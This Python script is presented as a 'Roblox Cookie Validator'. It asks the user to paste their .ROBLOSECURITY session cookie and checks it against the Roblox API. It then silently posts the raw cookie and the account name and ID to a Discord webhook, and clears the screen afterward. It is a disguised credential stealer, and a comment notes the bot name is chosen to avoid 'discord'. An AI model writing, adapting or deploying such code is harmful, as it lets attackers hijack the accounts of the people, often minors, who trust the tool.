import requests
import os
import json

# Discord webhook URL
WEBHOOK_URL = ""

def check_roblox_cookie(cookie):
    """
    Check if a .ROBLOSECURITY cookie is valid by making an API request.
    Returns True if valid, False if invalid or expired, along with a message.
    """
    url = "https://users.roblox.com/v1/users/authenticated"
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            return True, f"Cookie is valid! Authenticated as: {user_data['name']} (ID: {user_data['id']})"
        elif response.status_code == 401:
            return False, "Cookie is invalid or expired (HTTP 401 Unauthorized)."
        else:
            return False, f"Unexpected response: HTTP {response.status_code} - {response.text}"
    except requests.exceptions.RequestException as e:
        return False, f"Error making request: {e}"

def send_to_webhook(cookie, validity_message):
    """
    Send the cookie and its validity status to the Discord webhook.
    """
    payload = {
        "content": f"ROBLOSECURITY Cookie: `{cookie}`\nValidity: {validity_message}",
        "username": "RobloxCookieBot"  # Avoids "discord" in username
    }
    
    try:
        response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        if response.status_code == 204:
            print("Successfully sent to webhook.")
        else:
            print(f"Failed to send to webhook. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending to webhook: {e}")

def main():
    # Clear the CMD screen for a clean "GUI" look
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Display the prompt
    print("=====================================")
    print(" Roblox Cookie Validator")
    print("=====================================")
    cookie = input("Enter ROBLOSECURITY cookie: ").strip()
    
    # Check the cookie
    is_valid, message = check_roblox_cookie(cookie)
    
    # Send to webhook
    send_to_webhook(cookie, message)
    
    # Clear the screen again for result
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Display the result
    print("=====================================")
    print(" Roblox Cookie Validator - Result")
    print("=====================================")
    print(message)
    print("=====================================")
    
    # Pause so the user can see the result in CMD
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
